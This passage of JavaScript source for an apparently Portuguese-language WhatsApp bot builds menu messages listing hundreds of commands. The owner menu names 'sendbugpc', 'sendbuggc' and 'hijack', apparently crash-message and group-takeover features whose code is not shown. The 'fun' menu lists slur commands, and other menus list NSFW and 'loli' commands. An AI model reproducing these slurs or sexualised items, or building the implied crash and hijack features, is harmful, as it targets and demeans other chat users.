										"title": "𝘔𝘦𝘯𝘶 𝘈𝘯𝘰𝘯𝘺𝘮𝘰𝘶𝘴 𝘊𝘩𝘢𝘵",
										"description": "𝘊𝘭𝘪𝘲𝘶𝘦 𝘱𝘢𝘳𝘢 𝘫𝘰𝘨𝘢𝘳 𝘢𝘯𝘰𝘯𝘪𝘮𝘢𝘮𝘦𝘯𝘵𝘦.",
										"rowId": `${prefix}anonymousmenu`
									}
								]
							},
							{
								"title": "©️ Contribuidores",
								"rows": [
									{
										"title": "Obrigado para ❤️",
										"description": "Bruna - Mary - Ban",
										"rowId": `${prefix}tqto`
									}
								]
							}
						]
let con = `┏─────────────────⬣
┆ 𝑶𝒊𝒊, ${pushname} 👋
┗┬──────────────┈ ⳹
┏┆♠︎ 𝙽𝚘𝚖𝚎 : ${pushname}
┃┆♠︎ 𝙿𝚛𝚎𝚖𝚒𝚞𝚖 : ${isPremium ? '✅' : `❌`}
┃┆♠︎ 𝙻𝚒𝚖𝚒𝚝𝚎 :  ${isPremium ? '♾Infinity' : `〽️${db.data.users[m.sender].limit}`}
┗┬──────────────┈ ⳹
┏┤   𝑫𝒂𝒕𝒂 𝒆 𝑯𝒐𝒓𝒂
┆┗──────────────┈ ⳹
┆♠︎ 𝚃𝚎𝚖𝚙𝚘 𝙾𝚗𝚕𝚒𝚗𝚎 : ${runtime(process.uptime())}
┆♠︎ 𝙷𝚘𝚛𝚊𝚛𝚒𝚘 :  ${moment.tz('America/Fortaleza').format('HH')} H${moment.tz('America/Fortaleza').format('mm')} M${moment.tz('America/Fortaleza').format('ss')} S
┗─────────────────⬣`
let hariRayaramadan = new Date('Abril 21, 2023 23:59:59') 
     let sekarangg = new Date().getTime() 
     let lebih = hariRayaramadan - sekarangg 
     let harii = Math.floor( lebih / (1000 * 60 * 60 * 24)); 
     let jamm = Math.floor( lebih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60)) 
     let menitt = Math.floor( lebih % (1000 * 60 * 60) / (1000 * 60)) 
     let detikk = Math.floor( lebih % (1000 * 60) / 1000) 
let fot = `𝘊𝘢𝘴𝘰 𝘦𝘯𝘤𝘰𝘯𝘵𝘳𝘦 𝘢𝘭𝘨𝘶𝘯𝘴 𝘣𝘶𝘨 𝘰𝘶 𝘦𝘳𝘳𝘰, 𝘥𝘪𝘨𝘪𝘵𝘦 #𝘙𝘦𝘱𝘰𝘳𝘵𝘢𝘳
`
const listMessage = {
footer: fot,
text: 'Feito por Risky Modz',
title: con,
buttonText: `CLIQUE AQUI ⎙`, 
sections
}
const sendMsg = await client.sendMessage(m.chat, listMessage ,{quoted: fkontak})
}
break
            case 'allmenu':{
var unicorn = await getBuffer(picak+'All Menu')

const buttons = [
  {buttonId: 'delete', buttonText: {displayText: 'Apagar'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `╔════✪「 OWNER 」✪════╗
║〆 ${prefix}self
║〆 ${prefix}public
║〆 ${prefix}join [link]
║〆 ${prefix}leavegc
║〆 ${prefix}setbio
║〆 ${prefix}broadcast [text]
║〆 ${prefix}setppbot [image]
║〆 ${prefix}setthumb [reply img]
║〆 ${prefix}sendbugpc
║〆 ${prefix}sendbuggc
║〆 ${prefix}creategroup [name]
║〆 ${prefix}block [tag/number]
║〆 ${prefix}unblock [tag/number]
╚══════════
╔═❖「 GROUP 」❖════╗	        
║〆 ${prefix}grupo
║〆 ${prefix}link
║〆 ${prefix}resetar
║〆 ${prefix}setgp [imagem]
║〆 ${prefix}setnome [texto]
║〆 ${prefix}setdesc [texto]
║〆 ${prefix}editinfo [opção]
║〆 ${prefix}menfess [number]
║〆 ${prefix}add [user]
║〆 ${prefix}kick [reply/tag]
║〆 ${prefix}hidetag [text]
║〆 ${prefix}tagall [text]
║〆 ${prefix}antilinkgc [on/off]
║〆 ${prefix}antilinktg [on/off]
║〆 ${prefix}antilinktt [on/off]
║〆 ${prefix}antilinkytch [on/off]
║〆 ${prefix}antilinkytvid [on/off]
║〆 ${prefix}antilinkig [on/off]
║〆 ${prefix}antilinkfb [on/off]
║〆 ${prefix}antilinktwit [on/off]
║〆 ${prefix}antilinkall [on/off]
║〆 ${prefix}antivirus [on/off]
║〆 ${prefix}antitoxic [on/off]
║〆 ${prefix}antiwame [on/off]
║〆 ${prefix}nsfw [on/off]
║〆 ${prefix}nsfw [on/off]
║〆 ${prefix}promote [reply/tag]
║〆 ${prefix}demote [reply/tag]
║〆 ${prefix}react [reply emoji]
║〆 ${prefix}vote
║〆 ${prefix}devote
║〆 ${prefix}upvote
║〆 ${prefix}checkvote
║〆 ${prefix}delvote
╚══════════
╔═❖「 MAKER 」❖════╗
║〆 ${prefix}candy
║〆 ${prefix}blackpinkneon
║〆 ${prefix}deepsea
║〆 ${prefix}scifi
║〆 ${prefix}fiction
║〆 ${prefix}berry
║〆 ${prefix}fruitjuice
║〆 ${prefix}biscuit
║〆 ${prefix}wood
║〆 ${prefix}chocolate
║〆 ${prefix}matrix
║〆 ${prefix}blood
║〆 ${prefix}halloween
║〆 ${prefix}wicker
║〆 ${prefix}darkgold
║〆 ${prefix}firework
║〆 ${prefix}skeleton
║〆 ${prefix}sand
║〆 ${prefix}glue
║〆 ${prefix}leaves
║〆 ${prefix}magma
║〆 ${prefix}lava
║〆 ${prefix}rock
║〆 ${prefix}bloodglas
║〆 ${prefix}underwater
║〆 ${prefix}textmaker
║〆 ${prefix}honey
║〆 ${prefix}ice
║〆 ${prefix}watercolor
║〆 ${prefix}multicolor
║〆 ${prefix}snow
║〆 ${prefix}harrypot
║〆 ${prefix}harrypotter
║〆 ${prefix}brokenglass
║〆 ${prefix}waterpipe
║〆 ${prefix}spooky
║〆 ${prefix}circuit
║〆 ${prefix}metallic
║〆 ${prefix}demon
║〆 ${prefix}sparklechristmas
║〆 ${prefix}christmas
║〆 ${prefix}3dchristmas
║〆 ${prefix}3dbox
║〆 ${prefix}waterdrop
║〆 ${prefix}lion2
║〆 ${prefix}papercut
║〆 ${prefix}transformer
║〆 ${prefix}neondevil
║〆 ${prefix}3davengers
║〆 ${prefix}3dstone
║〆 ${prefix}3dstone2
║〆 ${prefix}summertime
║〆 ${prefix}thunder
║〆 ${prefix}window
║〆 ${prefix}graffiti
║〆 ${prefix}graffitibike
║〆 ${prefix}pornhub
║〆 ${prefix}glitch
║〆 ${prefix}blackpink
║〆 ${prefix}glitch2
║〆 ${prefix}glitch3
║〆 ${prefix}3dspace
║〆 ${prefix}lion
║〆 ${prefix}3dneon
║〆 ${prefix}greenneon
║〆 ${prefix}bokeh
║〆 ${prefix}holographic
║〆 ${prefix}bear
║〆 ${prefix}wolf
║〆 ${prefix}joker
║〆 ${prefix}dropwater
║〆 ${prefix}dropwater2
║〆 ${prefix}thewall
║〆 ${prefix}neonlight
║〆 ${prefix}natural
║〆 ${prefix}carbon
║〆 ${prefix}pencil
║〆 ${prefix}blackpink2
║〆 ${prefix}neon
║〆 ${prefix}neonlight2
║〆 ${prefix}toxic
║〆 ${prefix}strawberry
║〆 ${prefix}discovery
║〆 ${prefix}1917
║〆 ${prefix}sci_fi
║〆 ${prefix}ancient
║〆 ${prefix}fabric
║〆 ${prefix}hoorror
║〆 ${prefix}whitebear
║〆 ${prefix}juice
║〆 ${prefix}batman
║〆 ${prefix}multicolor
║〆 ${prefix}collwall
║〆 ${prefix}wonderful
║〆 ${prefix}cool
║〆 ${prefix}sketch
║〆 ${prefix}marvel
║〆 ${prefix}foggy
║〆 ${prefix}writing
║〆 ${prefix}halloweenfire
║〆 ${prefix}halloween
║〆 ${prefix}watercolor
║〆 ${prefix}classic
╚══════════
╔═❖「 DOWNLOAD 」❖════╗
║〆 ${prefix}tiktok [url]
║〆 ${prefix}tiktokaudio[url]
║〆 ${prefix}mediafire [url]
║〆 ${prefix}ytmp3 [url|quality]
║〆 ${prefix}ytmp4 [url|quality]
║〆 ${prefix}gitclone [repo link]
║〆 ${prefix}soundcloud [url]
║〆 ${prefix}zippyshare [url]
╚══════════
╔═❖「 SEARCH 」❖════╗	
║〆 ${prefix}play [query]
║〆 ${prefix}song [query]
║〆 ${prefix}yts [query]
║〆 ${prefix}lyrics [query]
║〆 ${prefix}google [query]
║〆 ${prefix}gimage [query]
║〆 ${prefix}pinterest [query]
║〆 ${prefix}image [query]
║〆 ${prefix}film [query]
║〆 ${prefix}wallpaper [query]
║〆 ${prefix}searchgc [query]
║〆 ${prefix}happymod [query]
║〆 ${prefix}servermc
║〆 ${prefix}mcpedl [query]
║〆 ${prefix}tvsearch [query]
║〆 ${prefix}wikimedia [query]
║〆 ${prefix}ytsearch [query]
║〆 ${prefix}ringtone [query]
║〆 ${prefix}wattpad [query]
║〆 ${prefix}mcserver [ip|port]
╚══════════
╔═❖「 CONVERT 」❖════╗
║〆 ${prefix}toimage [reply stick]
║〆 ${prefix}sticker [reply img|gif]
║〆 ${prefix}take [reply img|gif|stik]
║〆 ${prefix}smeme [reply img]
║〆 ${prefix}emoji [emoji]
║〆 ${prefix}tovideo [reply img]
║〆 ${prefix}togif [reply stick]
║〆 ${prefix}tourl [reply img]
║〆 ${prefix}tovn [reply aud]
║〆 ${prefix}tomp3 [reply vn]
║〆 ${prefix}toaudio [reply vid]
║〆 ${prefix}ebinary [reply txt]
║〆 ${prefix}dbinary [reply txt]
║〆 ${prefix}tinyurl [link]
║〆 ${prefix}styletext [text]
║〆 ${prefix}volume [reply aud]
║〆 ${prefix}bass [reply aud]
║〆 ${prefix}blown [reply aud]
║〆 ${prefix}deep [reply aud]
║〆 ${prefix}earrape [reply aud]
║〆 ${prefix}fast [reply aud]
║〆 ${prefix}fat [reply aud]
║〆 ${prefix}nightcore [reply aud]
║〆 ${prefix}reverse [reply aud]
║〆 ${prefix}robot [reply aud]
║〆 ${prefix}slow [reply aud]
║〆 ${prefix}squirrel [reply aud]
╚══════════
╔═❖「 IMG EFFECT 」❖════╗
║〆 ${prefix}wanted [reply img]
║〆 ${prefix}triggeredwebp [reply img]
║〆 ${prefix}removebg [reply img]
║〆 ${prefix}upscaler [reply img]
╚══════════
╔═❖「 RANDOM IMG 」❖════╗
║〆 ${prefix}coffee
║〆 ${prefix}woof
║〆 ${prefix}meow
║〆 ${prefix}lizard
║〆 ${prefix}wallneon
║〆 ${prefix}wallpubg
║〆 ${prefix}wallml
║〆 ${prefix}wallrandom
║〆 ${prefix}wallcode
║〆 ${prefix}animewall [query]
║〆 ${prefix}animewall2 [query]
╚══════════
╔═❖「 EMOTE 」❖════╗
║〆 ${prefix}instagramemoji
║〆 ${prefix}facebookemoji
║〆 ${prefix}iphoneemoji
║〆 ${prefix}samsungemoji
║〆 ${prefix}joyemoji
║〆 ${prefix}skypeemoji
║〆 ${prefix}twitteremoji
║〆 ${prefix}whatsappemoji
║〆 ${prefix}microsoftemoji
║〆 ${prefix}googleemoji
║〆 ${prefix}pediaemoji
║〆 ${prefix}microsoftemoji
╚══════════
╔═❖「 ANIME 」❖════╗
║〆 ${prefix}asuna
║〆 ${prefix}anna
║〆 ${prefix}chitoge
║〆 ${prefix}cosplay
║〆 ${prefix}elaina
║〆 ${prefix}emilia
║〆 ${prefix}gremory
║〆 ${prefix}kaguya
║〆 ${prefix}kotori
║〆 ${prefix}kurumi
║〆 ${prefix}mikasa
║〆 ${prefix}rize
║〆 ${prefix}naruto
║〆 ${prefix}yaoi
║〆 ${prefix}animeneko
║〆 ${prefix}waifu
║〆 ${prefix}animewaifu
║〆 ${prefix}animeawoo
║〆 ${prefix}shinobu
║〆 ${prefix}foxgirl
║〆 ${prefix}animemegumin
║〆 ${prefix}loli-waifu
║〆 ${prefix}8ball
║〆 ${prefix}animenom
║〆 ${prefix}goose
║〆 ${prefix}avatar
║〆 ${prefix}tickle
║〆 ${prefix}gecg
║〆 ${prefix}feed
║〆 ${prefix}animeslap
║〆 ${prefix}animepat
║〆 ${prefix}animeneko
║〆 ${prefix}animekiss
║〆 ${prefix}animewlp
║〆 ${prefix}animecuddle
║〆 ${prefix}animecry
║〆 ${prefix}animekill
║〆 ${prefix}animelick
║〆 ${prefix}animebite
║〆 ${prefix}animeyeet
║〆 ${prefix}animebully
║〆 ${prefix}animebonk
║〆 ${prefix}animewink
║〆 ${prefix}animepoke
║〆 ${prefix}animesmile
║〆 ${prefix}animewave
║〆 ${prefix}animeawoo
║〆 ${prefix}animeblush
║〆 ${prefix}animesmug
║〆 ${prefix}animeglomp
║〆 ${prefix}animehappy
║〆 ${prefix}animedance
║〆 ${prefix}animecringe
║〆 ${prefix}animehighfive
║〆 ${prefix}animehandhold
║〆 ${prefix}animemegumin
║〆 ${prefix}animesmug
║〆 ${prefix}couplepp
╚══════════
╔═❖「 STICKER 」❖════╗
║〆 ${prefix}patrick
║〆 ${prefix}emoji
║〆 ${prefix}emojimix
║〆 ${prefix}attp
║〆 ${prefix}ttp
║〆 ${prefix}doge
║〆 ${prefix}lovesticker
║〆 ${prefix}animestick
╚══════════
╔═❖「 ANIME STICKER 」❖════╗
║〆 ${prefix}loli
║〆 ${prefix}bully
║〆 ${prefix}cuddle
║〆 ${prefix}cry
║〆 ${prefix}hug
║〆 ${prefix}awoo
║〆 ${prefix}kiss
║〆 ${prefix}lick
║〆 ${prefix}pat
║〆 ${prefix}smug
║〆 ${prefix}bonk
║〆 ${prefix}yeet
║〆 ${prefix}blush
║〆 ${prefix}smile
║〆 ${prefix}wave
║〆 ${prefix}highfive
║〆 ${prefix}handhold
║〆 ${prefix}nom
║〆 ${prefix}glomp
║〆 ${prefix}bite
║〆 ${prefix}slap
║〆 ${prefix}kill
║〆 ${prefix}happy
║〆 ${prefix}wink
║〆 ${prefix}poke
║〆 ${prefix}dance
║〆 ${prefix}cringe
║〆 ${prefix}neko
║〆 ${prefix}gura
╚══════════
╔═❖「 NSFW 」❖════╗
║〆 ${prefix}hentaivideo
║〆 ${prefix}hneko
║〆 ${prefix}nwaifu
║〆 ${prefix}animespank
║〆 ${prefix}trap
║〆 ${prefix}gasm
╚══════════
╔═❖「 FUN 」❖════╗
║〆 ${prefix}how [text
║〆 ${prefix}when [text]
║〆 ${prefix}where [text]
║〆 ${prefix}is [text]
║〆 ${prefix}what [text]
║〆 ${prefix}can [text]
║〆 ${prefix}rate [text]
║〆 ${prefix}beautifulcheck [tag]
║〆 ${prefix}awesomecheck [tag]
║〆 ${prefix}prettycheck [tag]
║〆 ${prefix}lesbiancheck [tag]
║〆 ${prefix}gaycheck [tag]
║〆 ${prefix}cutecheck [tag]
║〆 ${prefix}uglycheck [tag]
║〆 ${prefix}hornycheck [tag]
║〆 ${prefix}charactercheck [tag]
║〆 ${prefix}lovelycheck [tag]
║〆 ${prefix}couple
║〆 ${prefix}mysoulmate
║〆 ${prefix}hot
║〆 ${prefix}sexy
║〆 ${prefix}kind
║〆 ${prefix}idiot
║〆 ${prefix}handsome
║〆 ${prefix}beautiful
║〆 ${prefix}cute
║〆 ${prefix}pretty
║〆 ${prefix}lesbian
║〆 ${prefix}noob
║〆 ${prefix}bastard
║〆 ${prefix}foolish
║〆 ${prefix}nerd
║〆 ${prefix}asshole
║〆 ${prefix}gay
║〆 ${prefix}smart
║〆 ${prefix}stubble
║〆 ${prefix}dog
║〆 ${prefix}horny
║〆 ${prefix}cunt
║〆 ${prefix}wibu
║〆 ${prefix}noobra
║〆 ${prefix}nibba
║〆 ${prefix}nibbi
║〆 ${prefix}comrade
║〆 ${prefix}mumu
║〆 ${prefix}rascal
║〆 ${prefix}scumbag
║〆 ${prefix}nuts
║〆 ${prefix}fagot
║〆 ${prefix}scoundrel
║〆 ${prefix}ditch
║〆 ${prefix}dope
║〆 ${prefix}gucci
║〆 ${prefix}lit
║〆 ${prefix}dumbass
║〆 ${prefix}crackhead
║〆 ${prefix}mf
║〆 ${prefix}motherfucker
║〆 ${prefix}sucker
║〆 ${prefix}fuckboy
║〆 ${prefix}playboy
║〆 ${prefix}fuckgirl
║〆 ${prefix}playgirl
╚══════════
╔═❖「 SOUND 」❖════╗
║〆 ${prefix}sound1
║〆 ${prefix}sound2
║〆 ${prefix}sound3
║〆 ${prefix}sound4
║〆 ${prefix}sound5
║〆 ${prefix}sound6
║〆 ${prefix}sound7
║〆 ${prefix}sound8
║〆 ${prefix}sound9
║〆 ${prefix}sound10
║〆 ${prefix}sound11
║〆 ${prefix}sound12
║〆 ${prefix}sound13
║〆 ${prefix}sound14
║〆 ${prefix}sound15
║〆 ${prefix}sound16
║〆 ${prefix}sound17
║〆 ${prefix}sound18
║〆 ${prefix}sound19
║〆 ${prefix}sound20
║〆 ${prefix}sound21
║〆 ${prefix}sound22
║〆 ${prefix}sound23
║〆 ${prefix}sound24
║〆 ${prefix}sound25
║〆 ${prefix}sound26
║〆 ${prefix}sound27
║〆 ${prefix}sound28
║〆 ${prefix}sound29
║〆 ${prefix}sound30
║〆 ${prefix}sound31
║〆 ${prefix}sound32
║〆 ${prefix}sound33
║〆 ${prefix}sound34
║〆 ${prefix}sound35
║〆 ${prefix}sound36
║〆 ${prefix}sound37
║〆 ${prefix}sound38
║〆 ${prefix}sound39
║〆 ${prefix}sound40
║〆 ${prefix}sound41
║〆 ${prefix}sound42
║〆 ${prefix}sound43
║〆 ${prefix}sound44
║〆 ${prefix}sound45
║〆 ${prefix}sound46
║〆 ${prefix}sound47
║〆 ${prefix}sound48
║〆 ${prefix}sound49
║〆 ${prefix}sound50
║〆 ${prefix}sound51
║〆 ${prefix}sound52
║〆 ${prefix}sound53
║〆 ${prefix}sound54
║〆 ${prefix}sound55
║〆 ${prefix}sound56
║〆 ${prefix}sound57
║〆 ${prefix}sound58
║〆 ${prefix}sound59
║〆 ${prefix}sound60
║〆 ${prefix}sound61
║〆 ${prefix}sound62
║〆 ${prefix}sound63
║〆 ${prefix}sound64
║〆 ${prefix}sound65
║〆 ${prefix}sound66
║〆 ${prefix}sound67
║〆 ${prefix}sound68
║〆 ${prefix}sound69
║〆 ${prefix}sound70
║〆 ${prefix}sound71
║〆 ${prefix}sound72
║〆 ${prefix}sound73
║〆 ${prefix}sound74
║〆 ${prefix}sound75
║〆 ${prefix}sound76
║〆 ${prefix}sound77
║〆 ${prefix}sound78
║〆 ${prefix}sound79
║〆 ${prefix}sound80
║〆 ${prefix}sound81
║〆 ${prefix}sound82
║〆 ${prefix}sound83
║〆 ${prefix}sound84
║〆 ${prefix}sound85
║〆 ${prefix}sound86
║〆 ${prefix}sound87
║〆 ${prefix}sound88
║〆 ${prefix}sound89
║〆 ${prefix}sound90
║〆 ${prefix}sound91
║〆 ${prefix}sound92
║〆 ${prefix}sound93
║〆 ${prefix}sound94
║〆 ${prefix}sound95
║〆 ${prefix}sound96
║〆 ${prefix}sound97
║〆 ${prefix}sound98
║〆 ${prefix}sound99
║〆 ${prefix}sound100
║〆 ${prefix}sound101
║〆 ${prefix}sound102
║〆 ${prefix}sound103
║〆 ${prefix}sound104
║〆 ${prefix}sound105
║〆 ${prefix}sound106
║〆 ${prefix}sound107
║〆 ${prefix}sound108
║〆 ${prefix}sound109
║〆 ${prefix}sound110
║〆 ${prefix}sound111
║〆 ${prefix}sound112
║〆 ${prefix}sound113
║〆 ${prefix}sound114
║〆 ${prefix}sound115
║〆 ${prefix}sound116
║〆 ${prefix}sound117
║〆 ${prefix}sound118
║〆 ${prefix}sound119
║〆 ${prefix}sound120
║〆 ${prefix}sound121
║〆 ${prefix}sound122
║〆 ${prefix}sound123
║〆 ${prefix}sound124
║〆 ${prefix}sound125
║〆 ${prefix}sound126
║〆 ${prefix}sound127
║〆 ${prefix}sound128
║〆 ${prefix}sound129
║〆 ${prefix}sound130
║〆 ${prefix}sound131
║〆 ${prefix}sound132
║〆 ${prefix}sound133
║〆 ${prefix}sound134
║〆 ${prefix}sound135
║〆 ${prefix}sound136
║〆 ${prefix}sound137
║〆 ${prefix}sound138
║〆 ${prefix}sound139
║〆 ${prefix}sound140
║〆 ${prefix}sound141
║〆 ${prefix}sound142
║〆 ${prefix}sound143
║〆 ${prefix}sound144
║〆 ${prefix}sound145
║〆 ${prefix}sound146
║〆 ${prefix}sound147
║〆 ${prefix}sound148
║〆 ${prefix}sound149
║〆 ${prefix}sound150
║〆 ${prefix}sound151
║〆 ${prefix}sound152
║〆 ${prefix}sound153
║〆 ${prefix}sound154
║〆 ${prefix}sound155
║〆 ${prefix}sound156
║〆 ${prefix}sound157
║〆 ${prefix}sound158
║〆 ${prefix}sound159
║〆 ${prefix}sound160
║〆 ${prefix}sound161
╚══════════
╔═❖「 GAME 」❖════╗
║〆 ${prefix}truth
║〆 ${prefix}dare
║〆 ${prefix}tictactoe
║〆 ${prefix}delttt
║〆 ${prefix}guess [option]
║〆 ${prefix}math [mode]
║〆 ${prefix}suitpvp [tag]
╚══════════
╔═❖「 ANONYMOUS CHAT 」❖════╗
║〆 ${prefix}anonymous
║〆 ${prefix}start
║〆 ${prefix}next
║〆 ${prefix}leave
╚══════════
╔═❖「 DATABASE 」❖════╗
║〆 ${prefix}setcmd
║〆 ${prefix}listcmd
║〆 ${prefix}delcmd
║〆 ${prefix}lockcmd
║〆 ${prefix}addmsg
║〆 ${prefix}listmsg
║〆 ${prefix}getmsg
║〆 ${prefix}delmsg
╚══════════
╔═❖「 OTHER 」❖════╗
║〆 ${prefix}afk
║〆 ${prefix}id
║〆 ${prefix}toqr [link]
║〆 ${prefix}repeat
║〆 ${prefix}readmore [text]
║〆 ${prefix}toviewonce
║〆 ${prefix}fliptext [text]]
║〆 ${prefix}chatinfo
║〆 ${prefix}alive
║〆 ${prefix}script
║〆 ${prefix}speedtest
║〆 ${prefix}ping
║〆 ${prefix}owner
║〆 ${prefix}menu
║〆 ${prefix}delete
║〆 ${prefix}quoted
║〆 ${prefix}listpc
║〆 ${prefix}listgc
║〆 ${prefix}donasi
║〆 ${prefix}request
║〆 ${prefix}report [bug]
╚═════════════✪`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
      case 'menudono':{
	   var unicorn = await getBuffer(picak+'Owner Menu')
const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `    「 𝘈𝘥𝘮𝘪𝘯𝘪𝘴𝘵𝘳𝘢𝘥𝘰𝘳𝘦𝘴 」
╔────────
║〆 ${prefix}self
║〆 ${prefix}public
║〆 ${prefix}join [link]
║〆 ${prefix}leavegc
║〆 ${prefix}setbio
║〆 ${prefix}hijack
║〆 ${prefix}creategroup [name]
║〆 ${prefix}block [user]
║〆 ${prefix}unblock [user]
║〆 ${prefix}broadcast [text]
║〆 ${prefix}setppbot [image]
║〆 ${prefix}setthumb [reply img]
║〆 ${prefix}setexif
╚═════════════✪`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
           case 'admin': case 'groupmenu':{
var unicorn = await getBuffer('https://i.ibb.co/tH1XPvd/logo-top.png')

const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `    「 𝘈𝘥𝘮𝘪𝘯𝘪𝘴𝘵𝘳𝘢𝘥𝘰𝘳𝘦𝘴 」
╔────────
║〆   *${prefix}grupo* 
║ > rank dos mais ativos do grupo
║〆  *${prefix}ativos* 
║ > mostra os ativos do bot             
║〆  *${prefix}status* 
║ > mostra os ativos do bot
║〆  *${prefix}linkgp* 
║ > envia o link do grupo
║〆  ${prefix}setgcpp [image]
║ > muda o perfil do grupo
║〆  ${prefix}setname [text]
║ > muda o nome do grupo
║〆  ${prefix}setdesc [text]
║ >  muda a desc do grupo
║〆  *${prefix}bug (info Bug)* 
║ > envia o bug para o dono
║〆  *${prefix}sugestao (txt)* 
║ > envia ao dono sua sugestão
║〆  *${prefix}listonline* 
║ > lista os membros so grupo online
║〆  *${prefix}admins* 
║ > lista dos administradores do grupo
║〆  *${prefix}level* 
║ > mostra seu nível
║〆  *${prefix}listonline* 
║ > lista os membros so grupo online
║〆  *${prefix}admins* 
║ > lista dos administradores do grupo
║〆  *${prefix}hidetag [texto]* 
║ > marcação invisível
║〆  *${prefix}editinfo [option]* 
║ > edita as quem pode editar
║〆  *${prefix}add [marca]* 
║ > adiciona um membro
║〆  *${prefix}ban [marca]* 
║ > remove um membro
║〆 ${prefix}pm [marca]
║ > promove um membro
║〆 ${prefix}dm [marca]
║ > rebaixar um membro
║〆 ${prefix}reage [emoji]
║ > reage com emoji
║〆 ${prefix}getpp [marca]
║ > pega foto de perfil de um membro
║〆 ${prefix}autosticker [on/off]
║〆 ${prefix}autostickerpc [on/off]
║〆 ${prefix}leveling [on/off]
║〆 ${prefix}antilinkgc [on/off]
║〆 ${prefix}antilinktg [on/off]
║〆 ${prefix}antilinktt [on/off]
║〆 ${prefix}antilinkytch [on/off]
║〆 ${prefix}antilinkytvid [on/off]
║〆 ${prefix}antilinkig [on/off]
║〆 ${prefix}antilinkfb [on/off]
║〆 ${prefix}antilinktwit [on/off]
║〆 ${prefix}antilinkall [on/off]
║〆 ${prefix}antivirus [on/off]
║〆 ${prefix}antitoxic [on/off]
║〆 ${prefix}antiwame [on/off]
║〆 ${prefix}nsfw [on/off]
╚─────────────────⊀`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
case 'makermenu':{
var unicorn = await getBuffer(picak+'Maker Menu')

const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `   「 𝘊𝘰𝘮𝘢𝘯𝘥𝘰𝘴 𝘔𝘢𝘬𝘦𝘳 」
╔──────── 
║〆 ${prefix}candy
║〆 ${prefix}8bit
║〆 ${prefix}horror
║〆 ${prefix}hoorror
║〆 ${prefix}retro
║〆 ${prefix}blackpinkneon
║〆 ${prefix}deepsea
║〆 ${prefix}scifi
║〆 ${prefix}fiction
║〆 ${prefix}berry
║〆 ${prefix}fruitjuice
║〆 ${prefix}biscuit
║〆 ${prefix}wood
║〆 ${prefix}chocolate
║〆 ${prefix}matrix
║〆 ${prefix}blood
║〆 ${prefix}halloween
║〆 ${prefix}wicker
║〆 ${prefix}darkgold
║〆 ${prefix}firework
║〆 ${prefix}skeleton
║〆 ${prefix}sand
║〆 ${prefix}glue
║〆 ${prefix}leaves
║〆 ${prefix}magma
║〆 ${prefix}lava
║〆 ${prefix}rock
║〆 ${prefix}bloodglas
║〆 ${prefix}underwater
║〆 ${prefix}textmaker
║〆 ${prefix}honey
║〆 ${prefix}ice
║〆 ${prefix}watercolor
║〆 ${prefix}multicolor
║〆 ${prefix}snow
║〆 ${prefix}harrypot
║〆 ${prefix}harrypotter
║〆 ${prefix}brokenglass
║〆 ${prefix}waterpipe
║〆 ${prefix}spooky
║〆 ${prefix}circuit
║〆 ${prefix}metallic
║〆 ${prefix}demon
║〆 ${prefix}sparklechristmas
║〆 ${prefix}christmas
║〆 ${prefix}3dchristmas
║〆 ${prefix}3dbox
║〆 ${prefix}waterdrop
║〆 ${prefix}lion2
║〆 ${prefix}papercut
║〆 ${prefix}transformer
║〆 ${prefix}neondevil
║〆 ${prefix}3davengers
║〆 ${prefix}3dstone
║〆 ${prefix}3dstone2
║〆 ${prefix}summertime
║〆 ${prefix}thunder
║〆 ${prefix}window
║〆 ${prefix}graffiti
║〆 ${prefix}graffitibike
║〆 ${prefix}pornhub
║〆 ${prefix}glitch
║〆 ${prefix}blackpink
║〆 ${prefix}glitch2
║〆 ${prefix}glitch3
║〆 ${prefix}3dspace
║〆 ${prefix}lion
║〆 ${prefix}3dneon
║〆 ${prefix}greenneon
║〆 ${prefix}bokeh
║〆 ${prefix}holographic
║〆 ${prefix}bear
║〆 ${prefix}wolf
║〆 ${prefix}joker
║〆 ${prefix}dropwater
║〆 ${prefix}dropwater2
║〆 ${prefix}thewall
║〆 ${prefix}neonlight
║〆 ${prefix}natural
║〆 ${prefix}carbon
║〆 ${prefix}pencil
║〆 ${prefix}blackpink2
║〆 ${prefix}neon
║〆 ${prefix}neonlight2
║〆 ${prefix}toxic
║〆 ${prefix}strawberry
║〆 ${prefix}discovery
║〆 ${prefix}1917
║〆 ${prefix}sci_fi
║〆 ${prefix}ancient
║〆 ${prefix}fabric
║〆 ${prefix}hoorror
║〆 ${prefix}whitebear
║〆 ${prefix}juice
║〆 ${prefix}batman
║〆 ${prefix}multicolor
║〆 ${prefix}collwall
║〆 ${prefix}wonderful
║〆 ${prefix}cool
║〆 ${prefix}sketch
║〆 ${prefix}marvel
║〆 ${prefix}foggy
║〆 ${prefix}writing
║〆 ${prefix}halloweenfire
║〆 ${prefix}halloween
║〆 ${prefix}watercolor
║〆 ${prefix}classic
╚─────────────────⊀`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
            case 'downloadmenu':{
var unicorn = await getBuffer(picak+'Download Menu')

const buttons = [
  {buttonId: 'd', buttonText: {displayText: '🗑️'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
    caption: `    「 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥𝘴 」
╔────────
║〆 ${prefix}tiktok [url]
║〆 ${prefix}tiktokaudio[url]
║〆 ${prefix}mediafire [url]
║〆 ${prefix}ytmp3 [url|qualidade]
║〆 ${prefix}ytmp4 [url|qualidade]
║〆 ${prefix}soundcloud [url]
║〆 ${prefix}zippyshare [url]
╚─────────────────⊀`,
    footer: `「${botname}」`,
    buttons: buttons,
    headerType: 4
}
const sendMsg = await client.sendMessage(m.chat, buttonMessage)
}
break
            case 'searchmenu':{
